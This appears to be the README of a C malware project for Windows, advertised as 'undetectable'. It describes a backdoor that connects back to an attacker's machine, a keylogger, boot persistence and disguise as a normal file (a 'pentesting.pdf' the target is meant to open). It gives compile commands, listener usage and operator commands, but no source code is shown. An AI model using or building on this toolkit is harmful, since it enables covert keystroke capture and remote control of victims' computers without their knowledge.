# **MALWARE DEVELOPMENT IN C**

This program is an undetectable malware written in C language. It is designed to be executed on a windows Machine.

## **FEATURES**

- create connection with target machine at any time
- Program automatically starts when target machine is rebooted
- Keylogger: to record keystrokes on target machine
- Program is masked like a normal program

## **INSTALLATION**

Target needs to run the pentesting.pdf file on a Windows machine

Alternatively, the program can be compiled on the hacking machine as an exe using the following commands:

        gcc server.c -o server

        1686-w64-mingw32-gcc -o malware.exe backdoor.c -lwininet -lwsock32

The exe file can then be run on the target machine

[!NOTE] modify the IP Adress of the hacking machine in backdoor.c and server.c

## USAGE

This command will listen to any incomming connection

`./server`

A connection is made when the target runs the malware. Once a connection is made, the following commands are available

To start the keylogger

`keylog_start`

To see Keystrokes of target machine after keylogger is started

`type windows.txt`

To enable Windows Persistence on the target Machine, run:

`persist`

To close connection and quit Program

`q`

### Header Files

- _<unistd.h>_ provides access to POSIX operating system API

- _<winsock2.h>_ used by function to store information about a given host

- _<wininit.h>_ winint files for interaction with FTP and HTTP

- _<sys/stat.h>_ contains constructs that facilitate getting info about file attributes

- _<sys/socket.h>_ provides definitions and declarations for socket interfaces

- _<netinit/in.h>_ contains definitions for internet protocol

- _<arpa/inet.h>_ definitions for internet operations

- _<sys/types.h>_ defined data type in source code

- <keylogger.h> keylogger file for recording keystrokes

### METHODS

- WinMain() : An APIENTRY point function that has access to different api functions

- shell(): To receive, execute commands from server and send output

- Main(): Listen to incomming connections, and receive response

- bootRun(): To create persistence on target machine

- str_cut(): cut part of a directory name

- chdir(): change working directory

- logKeys() - Defines each keyboard input as a character

- MessageBox() - send message to the target machine

**To remove, delete the program from the target machine**
